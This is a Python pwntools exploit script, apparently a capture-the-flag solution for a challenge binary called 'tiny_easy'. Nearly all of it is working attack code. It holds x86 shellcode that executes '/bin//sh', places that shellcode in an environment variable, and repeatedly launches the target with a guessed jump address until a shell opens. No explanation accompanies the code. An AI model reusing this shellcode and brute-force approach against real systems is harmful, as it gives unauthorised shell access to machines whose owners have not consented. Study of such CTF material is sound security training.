#!/usr/bin/python
from pwn import *

chall = '/home/tiny_easy/tiny_easy'

bin_ = u32(b'/bin')
sh_  = u32(b'//sh')
assembly = """
    nop
    nop
    nop
    nop
    nop

    /* Send a signal to  */
    /* stop bruteforcing */
    mov al, 4
    mov bl, 1
    lea ecx, [esp]
    mov dx, 0xffff
    int 0x80

    /* Pop Shell */
    xor eax, eax
    push eax
    push %d
    push %d
    lea ebx, [esp]
    push eax
    push ebx
    mov al, 0xb
    lea ecx, [esp]
    xor edx, edx
    int 0x80
    """ % (sh_, bin_)

def main():
    ## Target gadget
    target = 0xf774bb5a

    ## Bruteforce pointer
    ## &
    ## Jump to shellcode
    while True:
        p = process([p32(target)], 
                executable=chall, 
                env={'': asm(assembly)})
        try:
            data = p.recv()
            success('PWNED!!!')
            break
        except:
            print('[-] Failed')
            continue
    p.interactive()

if __name__ == '__main__':
    main()
